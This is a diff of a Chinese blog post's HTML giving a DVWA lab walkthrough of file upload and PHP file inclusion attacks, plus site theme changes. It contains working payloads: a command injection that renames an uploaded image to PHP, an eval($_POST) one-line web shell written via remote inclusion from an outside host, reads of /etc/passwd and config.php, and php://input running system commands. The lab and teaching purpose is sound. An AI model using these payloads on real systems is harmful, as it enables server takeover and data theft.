 <h3 id="扯到了菜刀原理"><a href="#扯到了菜刀原理" class="headerlink" title="扯到了菜刀原理"></a>扯到了菜刀原理</h3><p>上传成功，使用菜刀连接。显示连接失败<br>中国菜刀的原理是向上传文件发送包含123参数的post请求，通过控制123参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。//</p>
-<h3 id="解决方案-分析源码"><a href="#解决方案-分析源码" class="headerlink" title="解决方案(分析源码)"></a>解决方案(分析源码)</h3><p>啰嗦这么多原因就是<br>由于服务器解析成图片无法执行post命令<br>使用burpsuite抓包改，上传*。png文件，将后缀名改位php上传<br>//原理分析，在加载网页时候，php脚本已经加载完在浏览器中，当点击UPLOAD浏览器执行PHP脚本判断文件类型，但是burpsuite截取的是发送的http请求。所以这里burpsuite抓包显示已经对文件类型做出了判断为png。<br><img src="./11.png" alt=""><br><img src="./12.png" alt=""></p>
+<h3 id="解决方案-分析源码"><a href="#解决方案-分析源码" class="headerlink" title="解决方案(分析源码)"></a>解决方案(分析源码)</h3><p>啰嗦这么多原因就是<br>由于服务器解析成图片无法执行post命令<br>使用burpsuite抓包改，上传*。png文件，将后缀名改位php上传<br>//原理分析，在加载网页时候，php脚本已经加载完在浏览器中，当点击UPLOAD浏览器执行PHP脚本判断文件类型，但是burpsuite截取的是发送的http请求。所以这里burpsuite抓包显示已经对文件类型做出了判断为png。<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>high代码通过if条件语句判断文件后缀名+grtmagesize()限制上传文件内容的文件头必须带有图片后缀名才能上传成功<br>通过windows自带的<code>copy</code>命令将php文件与png图片合成</p>
-<h3 id="使用burpsuite无法修改后缀为php解决方案"><a href="#使用burpsuite无法修改后缀为php解决方案" class="headerlink" title="使用burpsuite无法修改后缀为php解决方案"></a>使用burpsuite无法修改后缀为php解决方案</h3><p>通过<code>burpsuite</code>截取改后缀名时无法成功，在服务端直接对文件后缀名判断。而<code>medium</code>只是对<code>content-type</code>做出了判断。<br><img src="./13.png" alt=""></p>
-<p><img src="./14.png" alt=""></p>
+<h3 id="使用burpsuite无法修改后缀为php解决方案"><a href="#使用burpsuite无法修改后缀为php解决方案" class="headerlink" title="使用burpsuite无法修改后缀为php解决方案"></a>使用burpsuite无法修改后缀为php解决方案</h3><p>通过<code>burpsuite</code>截取改后缀名时无法成功，在服务端直接对文件后缀名判断。而<code>medium</code>只是对<code>content-type</code>做出了判断。<br><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="./14.png" srcset="/img/loading.gif" alt=""></p>
 <h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用HIGH下的<code>COMMAND Injection</code><br><code>|dir</code>得出文件路径,结合uploads 时的路径提示</p>
 <blockquote>
 <blockquote>
@@ -242,9 +315,9 @@
 <p><code>127.0.0.1|  |rename ..\\..\\hackable\\uploads\\new1.png new1.php</code></p>
 </blockquote>
 </blockquote>
-<p><img src="./15.png" alt=""></p>
-<p>修改成功 使用菜刀连接<br><img src="./16.png" alt=""><br><img src="./17.png" alt=""></p>
-<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>访问url: <code>http://www.123.com/index.php?page=/etc/passwd</code>，存在若有相应权限读出文件内容。反之得出：<code>open_basedir restriction in effect</code>警告<br>常见敏感信息如下：<br><img src="./18.png" alt=""></p>
+<p><img src="./15.png" srcset="/img/loading.gif" alt=""></p>
+<p>修改成功 使用菜刀连接<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>访问url: <code>http://www.123.com/index.php?page=/etc/passwd</code>，存在若有相应权限读出文件内容。反之得出：<code>open_basedir restriction in effect</code>警告<br>常见敏感信息如下：<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h2><p>条件：<code>allow_url_fopen</code>选项是激活的</p>
 <ol>
 <li>远程木马存在地址<code>http://www.example.com/echo.txt</code><br><strong>文件内容<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;&quot;)?&gt;</code></strong></li>
@@ -253,11 +326,11 @@
 <li>执行url：<code>http://www.123.com/index.php?page=http://www.example.com/echo.txt</code><br><strong>写入一句话木马<code>&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;</code></strong></li>
 </ol>
 <h2 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h2><p>上传文件后，使用文件包含漏洞访问。这里就不赘述了。 </p>
-<h2 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h2><p>PHP内置协议如图，与<code>fopen(),copy(),file_exists(),filesize()</code>等文件系统函数所提供功能相似<br><img src="./19.png" alt=""></p>
+<h2 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h2><p>PHP内置协议如图，与<code>fopen(),copy(),file_exists(),filesize()</code>等文件系统函数所提供功能相似<br><img src="./19.png" srcset="/img/loading.gif" alt=""></p>
 <ol>
 <li><p>封装协议读取PHP文件<br><code>http://www.123.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</code><br>上文试题也有详细操作，就不赘述了。</p>
 </li>
-<li><p>写入PHP文件<br>使用 <code>php://input</code><br>条件：<code>allow_url_include()</code> 为 <code>On</code><br>URL:<code>http://192.168.43.195/DVWA/vulnerabilities/fi/?page=php://input</code><br><code>&lt;?php system(&#39;net user&#39;);?&gt;</code><br><img src="./20.png" alt=""></p>
+<li><p>写入PHP文件<br>使用 <code>php://input</code><br>条件：<code>allow_url_include()</code> 为 <code>On</code><br>URL:<code>http://192.168.43.195/DVWA/vulnerabilities/fi/?page=php://input</code><br><code>&lt;?php system(&#39;net user&#39;);?&gt;</code><br><img src="./20.png" srcset="/img/loading.gif" alt=""></p>
 </li>
 </ol>
 <p>使用写入一句话木马也是可以 得使用<code>fputs</code>和 <code>fopen</code>函数</p>
@@ -271,161 +344,259 @@
 <li><strong>尽量不使用动态包含，写死网页 include(“head.php”)</strong></li>
 </ul>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/LFI/">LFI</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/12/28/DVWA-XSS/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DVWA_XSS</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/12/27/DVWA-CSRF/">
+                        <span class="hidden-mobile">DVWA_CSRF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">1.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW"><span class="toc-number">1.2.</span> <span class="toc-text">LOW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#本地包含"><span class="toc-number">1.2.1.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程包含"><span class="toc-number">1.2.2.</span> <span class="toc-text">远程包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MEDIUM"><span class="toc-number">1.3.</span> <span class="toc-text">MEDIUM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">1.4.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-伪协议使用"><span class="toc-number">1.4.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 伪协议使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inlcusion"><span class="toc-number">2.</span> <span class="toc-text">File Inlcusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW-1"><span class="toc-number">2.1.</span> <span class="toc-text">LOW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MEDIUM-1"><span class="toc-number">2.2.</span> <span class="toc-text">MEDIUM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扯到了菜刀原理"><span class="toc-number">2.2.1.</span> <span class="toc-text">扯到了菜刀原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方案-分析源码"><span class="toc-number">2.2.2.</span> <span class="toc-text">解决方案(分析源码)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HIGH"><span class="toc-number">2.3.</span> <span class="toc-text">HIGH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用burpsuite无法修改后缀为php解决方案"><span class="toc-number">2.3.1.</span> <span class="toc-text">使用burpsuite无法修改后缀为php解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方案"><span class="toc-number">2.3.2.</span> <span class="toc-text">解决方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP文件包含利用"><span class="toc-number">3.</span> <span class="toc-text">PHP文件包含利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#读取敏感文件"><span class="toc-number">3.1.</span> <span class="toc-text">读取敏感文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程包含shell"><span class="toc-number">3.2.</span> <span class="toc-text">远程包含shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含配合文件上传"><span class="toc-number">3.3.</span> <span class="toc-text">本地包含配合文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP封装协议"><span class="toc-number">3.4.</span> <span class="toc-text">PHP封装协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#包含Apache日志文件"><span class="toc-number">3.5.</span> <span class="toc-text">包含Apache日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截断包含"><span class="toc-number">3.6.</span> <span class="toc-text">截断包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安全编写包含"><span class="toc-number">4.</span> <span class="toc-text">安全编写包含</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&text=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&is_video=false&description=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=DVWA_(FILE inclusion&amp;uploads)&body=Check out this article: http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&name=DVWA_(FILE inclusion&amp;uploads)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&t=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "DVWA_(FILE inclusion&uploads)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
